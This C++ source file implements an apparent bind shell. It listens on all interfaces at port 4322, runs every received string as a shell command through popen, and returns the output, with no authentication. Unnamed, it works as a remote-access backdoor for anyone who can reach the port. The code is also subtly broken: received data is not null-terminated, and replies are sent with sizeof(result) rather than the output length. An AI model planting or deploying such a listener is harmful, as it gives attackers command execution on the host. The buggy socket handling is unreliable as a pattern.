#include <sys/socket.h>  // For socket
#include <netinet/in.h>  // For IP PROTO TCP
#include <arpa/inet.h>   // For inet addr ip mentioning
#include <bits/stdc++.h> // For memset
#include<unistd.h>
#include <stdexcept>
using namespace std;
#define PORT 4322

string exec(string command) {
   char buffer[128];
   string result = "";

   // Open pipe to file
   FILE* pipe = popen(command.c_str(), "r");
   if (!pipe) {
      return "popen failed!";
   }

   // read till end of process:
   while (!feof(pipe)) {

      // use buffer to read and add to result
      if (fgets(buffer, 128, pipe) != NULL)
         result += buffer;
   }

   pclose(pipe);
   return result;
}

int main(){
    string text;
    int sfd = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in myaddr, paddr;
    //printf("%d\n",sfd);
    myaddr.sin_addr.s_addr = inet_addr("0.0.0.0");
    myaddr.sin_family = AF_INET;
    myaddr.sin_port = htons(PORT);
    bzero(&myaddr.sin_zero, 8);
    int size;
    int k2 = bind(sfd, (struct sockaddr *)&myaddr, sizeof(struct sockaddr_in));
    //printf("%d\n",k2);
    int k3 = listen(sfd, 10);
    //printf("%d\n",k3);
    socklen_t addrlen;
    addrlen = sizeof(paddr);
    int nsfd = accept(sfd, (struct sockaddr *)&paddr, &addrlen);
    while (1)
    {
        char buffer[108];
        int temp = recv(nsfd, buffer, 105, 0);
        string tstr = buffer;
        if(tstr == "exit"){
            break;
        }
        string result = exec(tstr);
        send(nsfd, result.c_str(), sizeof(result), 0);
    }
    close(nsfd);
    close(sfd);
    return 0;
}